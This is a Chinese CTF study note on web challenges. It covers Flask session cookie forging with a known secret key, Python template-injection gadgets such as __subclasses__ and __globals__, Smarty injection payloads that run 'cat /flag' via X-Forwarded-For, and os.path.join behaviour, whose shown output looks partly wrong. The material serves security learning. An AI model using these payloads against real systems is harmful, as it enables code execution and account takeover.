##  session伪造

**可以使用Wappalyzer 看看网站构造**

```nginx
# 使用flask_session_cookie_manager3.py进行解码看看
# 就是需要寻找到secret_key

# 解码
python3 flask_session_cookie_manager3.py 
decode -c 'eyJuYW1lIjoiMTIzIn0.ZICAzQ.I5lx6d3ZDDNkVbRdhgozyotzxXU' -s "LitCTF"

# 编码
python3 flask_session_cookie_manager3.py encode -s 'LitCTF' -t '{"name":"admin"}'
```







## 模版注入

**==详细==**：https://xz.aliyun.com/t/9584#toc-32

### 0、基础知识

> ==flash模板注入可利用的Python模块==

1.   **subprocess.Popen**
2.   **os.wrap_close**
3.   **warnings.catch_warnings**
4.   **class 'site._Printer'**

>   常用搭配方式：
>
>   1.   `__class__`列出对象的属性
>   2.   `__class__.__mro__`找到object属性的位置
>   3.   `__class__.__mro__[object位置下标].__subclasses__()`列出所有属性

-   `__class__：对象的属性，返回对象的类型`
-   `__mro__：类的属性，返回包含类的所有父亲元组`
-   `__base__：类的属性，返回类所继承的基类`
-   `__globals__：函数的属性，返回一个字典（每个函数都有）`
    -   里面有当前空间下能使用的模块、方法、全局变量
-   `__init__：类的初始化方法`
-   `__subclasses__()：类的属性，子类的列表`
-   `__import__：`
    -   结构：`__improt__(<module name>)`
    -   功能：返回一个模块：`a = __import__("os")`
-   `exec`
    -   结构：`exec(<python code>)`
    -   功能：运行Python代码，`exec(''' import os ''')`
-   `open`
    -   结构：`open(<file path>)`
    -   功能：返回一个file对象，`open("flag.txt","r")`
-   `_getitem__`
    -   结构：`[1,2,3].__getitem__(2) == 3`   `{"a":1}.__getitem__("a") == 1`
    -   功能：根据list的index返回对应元素    根据key名，返回字典中对应的value
-   `pop`
    -   结构：
        -   `[1,2,3].pop(0) == 1`		
            -   返回list的第0个元素，并且list的元素减少	
        -   `{"a":1}.pop("a") == 1`
            -   返回dict的key对应的value



### Smary

> 题目地址：https://www.nssctf.cn/problem/5

```nginx
# 基于X-Forwarded-For的模版注入,单双引号不区别
{if system('cat /flag')}{/if}
{if show_source('/flag')}{/if}
{system("cat /flag")}
{{system('cat /flag')}}

```



## 文件上传

### os.path.join()函数

> 题目地址：https://www.nssctf.cn/problem/2025

```nginx
# 函数的用处，常用路径拼接
首字母没有包含 ' \ ' 则会自己加上
如果首字母是 ' / ' 会保留原型

Path1 = 'home'
Path2 = '/develop'
Path3 = 'code'
Path10 = Path1 + Path2 + Path3
Path20 = os.path.join(Path1,Path2,Path3)
print ('Path10 = ',Path10)
print ('Path20 = ',Path20)
# Path10 = home/developcode
# Path20 = /develop\code
```

